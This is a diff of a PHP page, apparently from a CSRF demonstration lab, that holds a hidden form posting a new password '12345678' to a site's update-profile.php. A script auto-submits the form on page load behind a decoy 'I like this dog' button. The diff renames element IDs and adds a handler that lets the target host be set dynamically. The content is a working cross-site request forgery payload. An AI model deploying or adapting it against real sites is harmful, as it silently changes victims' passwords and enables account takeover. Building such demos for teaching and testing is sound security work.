@@ -15,10 +15,10 @@
                 <?php unset($_GET['update']); ?>
             <?php else: ?>
                 <!-- Form for deleting all pics-->
-                <form method="POST" action="http://ccc-xsrf.dev/update-profile.php" class="form-horizontal text-center hidden" id="xsrf_form">
+                <form method="POST" action="http://ccc-xsrf.dev/update-profile.php" class="form-horizontal text-center hidden" id="xsrf-form">
                     <input type="hidden" name="password" value="12345678">
                     <input type="hidden" name="password-confirmation" value="12345678">
-                    <button class="btn btn-success" type="submit" name="submit" id="xsrf_submit" >
+                    <button class="btn btn-success" type="submit" name="submit" id="xsrf-submit" >
                         <i class="fa fa-btn fa-check"></i>I like this dog
                     </button>
                 </form>
@@ -26,7 +26,11 @@
                 <!-- Script for auto-submitting the form -->
                 <script>
                     $(window).load(function() {
-                        $("#xsrf_submit").click();
+                        $("#xsrf-submit").click();
+                    });
+                    $( "#host" ).on("change", function() {
+                        console.log($("#host").val());
+                        $("#xsrf-form").attr("action", $("#host").val() + "/update-profile.php");
                     });
                 </script>
             <?php endif; ?>
